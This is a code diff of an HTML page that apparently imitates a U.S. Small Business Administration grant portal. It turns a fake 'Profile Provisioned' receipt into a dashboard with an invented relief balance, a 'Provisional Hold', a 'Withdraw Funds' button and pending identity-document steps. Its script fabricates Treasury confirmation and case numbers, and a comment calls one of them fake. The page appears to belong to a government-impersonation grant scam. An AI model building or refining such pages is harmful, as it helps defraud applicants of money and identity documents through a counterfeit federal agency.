@@ -3,143 +3,161 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SBA | Provisioning Success</title>
+    <title>SBA Dashboard | Case Management</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;700;900&display=swap');
-        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;700;900&display=swap');
+        :root { --sba-navy: #002e6d; --sba-blue: #0071bc; --slate-bg: #f8fafc; }
+        body { font-family: 'Public Sans', sans-serif; background-color: var(--slate-bg); color: #1e293b; }
 
-        :root { --sba-blue: #002e6d; --sba-red: #cc0000; --sba-navy: #001a3d; }
-        body { font-family: 'Public Sans', sans-serif; background-color: #f1f5f9; color: #1e293b; }
+        .sidebar { background: #ffffff; border-right: 1px solid #e2e8f0; width: 260px; height: 100vh; position: fixed; left: 0; top: 0; z-index: 50; }
+        .main-content { margin-left: 260px; padding: 30px; }
         
-        .sba-logo-box { position: relative; display: inline-block; padding: 4px 8px; }
-        .sba-logo-box::before { content: ""; position: absolute; top: 0; left: 0; right: 0; bottom: 5px; border-top: 3px solid var(--sba-blue); border-left: 3px solid var(--sba-blue); border-right: 3px solid var(--sba-blue); }
-        .sba-logo-box::after { content: ""; position: absolute; bottom: 0; left: 0; right: 30%; height: 3px; background: var(--sba-red); }
+        .stat-card { background: white; border-radius: 8px; border: 1px solid #e2e8f0; padding: 20px; transition: 0.3s; }
+        .stat-card:hover { border-color: var(--sba-blue); transform: translateY(-2px); box-shadow: 0 10px 20px rgba(0,0,0,0.05); }
 
-        .success-icon { width: 70px; height: 70px; background: white; color: #16a34a; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 32px; margin: 0 auto 20px; border: 4px solid #16a34a; box-shadow: 0 0 20px rgba(22, 163, 74, 0.2); animation: scaleUp 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
-        
-        .receipt-card { background: white; border-radius: 4px; border-top: 6px solid var(--sba-blue); box-shadow: 0 15px 35px rgba(0,0,0,0.1); position: relative; overflow: hidden; }
-        .receipt-card::after { content: "CERTIFIED"; position: absolute; top: 40px; left: 50%; font-size: 45px; color: rgba(0, 46, 109, 0.04); font-weight: 900; transform: translateX(-50%) rotate(-15deg); pointer-events: none; }
+        .balance-hero { background: var(--sba-navy); color: white; border-radius: 12px; padding: 40px; position: relative; overflow: hidden; }
+        .balance-hero::after { content: "\f19c"; font-family: "Font Awesome 6 Free"; font-weight: 900; position: absolute; right: -20px; bottom: -20px; font-size: 150px; opacity: 0.05; }
 
-        .receipt-row { display: flex; justify-content: space-between; margin-bottom: 12px; border-bottom: 1px dashed #cbd5e1; padding-bottom: 8px; gap: 10px; }
-        .receipt-label { font-weight: 900; color: #64748b; text-transform: uppercase; font-size: 10px; letter-spacing: 1px; min-width: 90px; }
-        .receipt-value { color: var(--sba-navy); font-family: 'JetBrains Mono', monospace; font-weight: 700; font-size: 12px; text-align: right; word-break: break-all; }
+        .status-pill { padding: 4px 12px; border-radius: 100px; font-size: 10px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; }
+        .status-pending { background: #fef3c7; color: #92400e; border: 1px solid #fde68a; }
 
-        .urgent-note { background: #fff7ed; border-left: 5px solid #f97316; padding: 15px; border-radius: 4px; }
-        
-        @keyframes scaleUp { from { transform: scale(0.5); opacity: 0; } to { transform: scale(1); opacity: 1; } }
-        
-        .btn-portal { background: var(--sba-blue); height: 60px; transition: all 0.2s; box-shadow: 0 4px 15px rgba(0, 46, 109, 0.3); cursor: pointer; display: flex; align-items: center; justify-content: center; border: none; }
-        .btn-portal:active { transform: scale(0.98); background: #001a3d; }
+        .nav-link { display: flex; align-items: center; gap: 12px; padding: 12px 20px; color: #64748b; font-size: 14px; font-weight: 600; border-radius: 6px; transition: 0.2s; }
+        .nav-link.active { background: #f1f5f9; color: var(--sba-navy); }
+        .nav-link:hover { background: #f1f5f9; color: var(--sba-navy); }
+
+        @media (max-width: 1024px) {
+            .sidebar { transform: translateX(-100%); }
+            .main-content { margin-left: 0; padding: 20px; }
+        }
     </style>
 </head>
-<body class="flex flex-col min-h-screen">
+<body>
 
-    <div class="bg-[#efefef] py-2 px-5 flex items-center justify-between border-b border-gray-200">
-        <div class="flex items-center gap-2">
-            <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" class="w-4 shadow-sm" alt="U.S. Flag">
-            <span class="text-[10px] font-black text-gray-500 uppercase tracking-widest">Provisioning Receipt</span>
+    <aside class="sidebar p-6 hidden lg:flex flex-col">
+        <div class="flex items-center gap-2 mb-10">
+            <div class="bg-[#002e6d] text-white px-2 py-0.5 font-black text-xl rounded-sm">SBA</div>
+            <span class="text-[10px] font-black text-gray-400 uppercase leading-tight tracking-widest">Portal<br>2026</span>
         </div>
-        <span class="text-[9px] font-black text-green-600 uppercase tracking-tighter">SECURE_HANDSHAKE</span>
-    </div>
 
-    <header class="bg-white border-b border-gray-200 py-4 px-6 flex justify-center shadow-sm">
-        <div class="flex items-center gap-2">
-            <div class="sba-logo-box">
-                <span class="text-xl font-black text-[#002e6d] tracking-tighter uppercase">SBA</span>
-            </div>
-            <div class="text-left">
-                <p class="text-[10px] font-black text-[#002e6d] uppercase leading-none">Administration</p>
-            </div>
-        </div>
-    </header>
+        <nav class="space-y-2 flex-grow">
+            <a href="#" class="nav-link active"><i class="fas fa-grid-2"></i> Dashboard</a>
+            <a href="#" class="nav-link"><i class="fas fa-file-invoice-dollar"></i> Grant Status</a>
+            <a href="#" class="nav-link"><i class="fas fa-wallet"></i> Wallet & Payout</a>
+            <a href="#" class="nav-link"><i class="fas fa-user-shield"></i> Verification</a>
+            <a href="#" class="nav-link"><i class="fas fa-envelope"></i> Messages</a>
+        </nav>
 
-    <main class="flex-grow flex items-center justify-center p-5">
-        <div class="max-w-[420px] w-full text-center">
-            
-            <div class="success-icon">
-                <i class="fas fa-check"></i>
-            </div>
-
-            <h2 class="text-2xl font-black text-[#002e6d] mb-1 tracking-tighter uppercase">Profile Provisioned</h2>
-            <p class="text-slate-400 text-[10px] font-bold uppercase tracking-[0.2em] mb-8">
-                Verified within the Federal Grant System (FGS)
-            </p>
-
-            <div class="receipt-card p-6 text-left mb-6">
-                <div class="receipt-row">
-                    <span class="receipt-label">Account Status</span>
-                    <span class="receipt-value text-orange-600 animate-pulse">PROVISIONAL_HOLD</span>
-                </div>
-                <div class="receipt-row">
-                    <span class="receipt-label">Filing ID</span>
-                    <span class="receipt-value text-blue-700" id="trackingId">GENERATING...</span>
-                </div>
-                <div class="receipt-row">
-                    <span class="receipt-label">Allocation</span>
-                    <span class="receipt-value">EIDL-TARGETED-2026</span>
-                </div>
-                <div class="receipt-row" style="border: none; margin-bottom: 0;">
-                    <span class="receipt-label">Node Access</span>
-                    <span class="receipt-value text-[11px] opacity-70" id="encKey">...</span>
-                </div>
-            </div>
-
-            <div class="urgent-note mb-8 shadow-sm">
-                <div class="flex gap-4">
-                    <i class="fas fa-shield-halved text-orange-600 mt-1 text-sm"></i>
-                    <div class="text-left">
-                        <h4 class="text-orange-900 font-black text-[11px] uppercase tracking-wider mb-1">Final Action Required</h4>
-                        <p class="text-[10px] text-orange-800 font-bold leading-relaxed uppercase">
-                            To lift the <span class="underline">PROVISIONAL HOLD</span> and release allocated funds, you must complete your full Case Profile in the dashboard.
-                        </p>
-                    </div>
-                </div>
-            </div>
-
-            <button onclick="window.location.href='dashboard.html'" class="btn-portal w-full text-white font-black rounded-md uppercase tracking-[0.2em] text-[12px]">
-                Enter Secure Dashboard <i class="fas fa-chevron-right ml-2"></i>
+        <div class="pt-6 border-t border-gray-100">
+            <button id="logoutBtn" class="nav-link w-full text-red-600 hover:bg-red-50">
+                <i class="fas fa-sign-out-alt"></i> Sign Out
             </button>
+        </div>
+    </aside>
 
-            <p class="mt-8 text-[9px] text-slate-400 font-black uppercase tracking-widest">
-                U.S. Treasury Confirmation #<span id="receiptNum" class="text-slate-500">...</span>
-            </p>
+    <main class="main-content">
+        <header class="flex justify-between items-center mb-8">
+            <div>
+                <h1 class="text-2xl font-black text-slate-800 tracking-tight">Case Overview</h1>
+                <p class="text-sm text-slate-500 font-medium" id="welcomeUser">Welcome back, applicant</p>
+            </div>
+            <div class="flex gap-4">
+                <div class="bg-white border border-gray-200 p-2 rounded-full px-4 flex items-center gap-2">
+                    <div class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
+                    <span class="text-[10px] font-bold text-slate-600 uppercase tracking-widest">Server: Online</span>
+                </div>
+            </div>
+        </header>
+
+        <section class="balance-hero shadow-2xl mb-8">
+            <div class="flex flex-col md:flex-row justify-between items-start md:items-center gap-6">
+                <div>
+                    <p class="text-[11px] font-black uppercase tracking-[0.3em] opacity-70 mb-2">Allocated Relief Balance</p>
+                    <h2 class="text-5xl font-black tracking-tighter" id="totalBalance">$0.00</h2>
+                </div>
+                <div class="flex flex-col gap-2">
+                    <span class="status-pill status-pending text-center">Provisional Hold</span>
+                    <button class="bg-white text-[#002e6d] px-6 py-2.5 rounded font-black text-[11px] uppercase tracking-wider hover:bg-slate-100 transition">
+                        Withdraw Funds
+                    </button>
+                </div>
+            </div>
+        </section>
+
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
+            <div class="stat-card">
+                <p class="text-[10px] font-black text-slate-400 uppercase tracking-widest mb-1">Case Number</p>
+                <p class="text-lg font-bold text-slate-800" id="caseNum">---</p>
+            </div>
+            <div class="stat-card">
+                <p class="text-[10px] font-black text-slate-400 uppercase tracking-widest mb-1">Assigned Agent</p>
+                <p class="text-lg font-bold text-slate-800">U.S. SBA Node #15</p>
+            </div>
+            <div class="stat-card">
+                <p class="text-[10px] font-black text-slate-400 uppercase tracking-widest mb-1">Verification Level</p>
+                <div class="flex items-center gap-2 mt-1">
+                    <div class="h-2 w-full bg-slate-100 rounded-full overflow-hidden">
+                        <div class="h-full bg-blue-600 w-[65%]"></div>
+                    </div>
+                    <span class="text-xs font-bold text-blue-600">65%</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="bg-white rounded-lg border border-gray-200 overflow-hidden shadow-sm">
+            <div class="p-6 border-b border-gray-100 flex justify-between items-center">
+                <h3 class="font-black text-xs uppercase tracking-widest text-slate-800">Pending Certifications</h3>
+                <i class="fas fa-ellipsis-h text-slate-300"></i>
+            </div>
+            <div class="overflow-x-auto">
+                <table class="w-full text-left">
+                    <thead class="bg-slate-50 border-b border-gray-100">
+                        <tr>
+                            <th class="p-4 text-[10px] font-black text-slate-400 uppercase">Document Name</th>
+                            <th class="p-4 text-[10px] font-black text-slate-400 uppercase">Status</th>
+                            <th class="p-4 text-[10px] font-black text-slate-400 uppercase">Action</th>
+                        </tr>
+                    </thead>
+                    <tbody class="text-sm divide-y divide-gray-50">
+                        <tr>
+                            <td class="p-4 font-bold text-slate-700">Identity Verification (Form 4506-C)</td>
+                            <td class="p-4"><span class="status-pill status-pending">Awaiting Sync</span></td>
+                            <td class="p-4"><a href="#" class="text-blue-600 font-black text-xs uppercase">Resume</a></td>
+                        </tr>
+                        <tr>
+                            <td class="p-4 font-bold text-slate-700">Business Certification Ledger</td>
+                            <td class="p-4"><span class="status-pill status-pending text-[8px]">In Review</span></td>
+                            <td class="p-4"><a href="#" class="text-slate-400 font-black text-xs uppercase cursor-not-allowed">Locked</a></td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
         </div>
     </main>
 
-    <footer class="py-6 text-center">
-         <p class="text-[9px] text-slate-300 font-bold uppercase tracking-[0.4em]">Authorized Personnel Only | NODE-V15</p>
-    </footer>
-
     <script type="module">
         import { auth, db } from './firebase-config.js';
-        import { onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+        import { onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
         import { doc, getDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
         onAuthStateChanged(auth, async (user) => {
             if (user) {
-                const shortId = user.uid.substring(0, 7).toUpperCase();
-                document.getElementById('receiptNum').innerText = `${Math.floor(3000+Math.random()*6000)}-${shortId}`;
-                document.getElementById('encKey').innerText = `NODE-${shortId}-TLS1.3`;
-
-                try {
-                    const userDoc = await getDoc(doc(db, "users", user.uid));
-                    if (userDoc.exists()) {
-                        const data = userDoc.data();
-                        // Displays the specific case number if you saved one, otherwise generates a fake professional one
-                        document.getElementById('trackingId').innerText = data.caseNumber || `SBA-${shortId}-CERT`;
-                    } else {
-                        document.getElementById('trackingId').innerText = `SBA-${shortId}-CERT`;
-                    }
-                } catch (e) { 
-                    document.getElementById('trackingId').innerText = `SBA-${shortId}-CERT`;
+                const userDoc = await getDoc(doc(db, "users", user.uid));
+                if (userDoc.exists()) {
+                    const data = userDoc.data();
+                    document.getElementById('welcomeUser').innerText = `Welcome back, ${data.fullName || 'Applicant'}`;
+                    document.getElementById('totalBalance').innerText = `$${(data.balance || 15000).toLocaleString()}.00`;
+                    document.getElementById('caseNum').innerText = `SBA-${user.uid.substring(0, 8).toUpperCase()}`;
                 }
             } else {
-                // If not logged in, boot them back to login
                 window.location.href = 'login.html';
             }
         });
+
+        document.getElementById('logoutBtn').onclick = () => {
+            signOut(auth).then(() => window.location.href = 'login.html');
+        };
     </script>
 </body>
 </html>
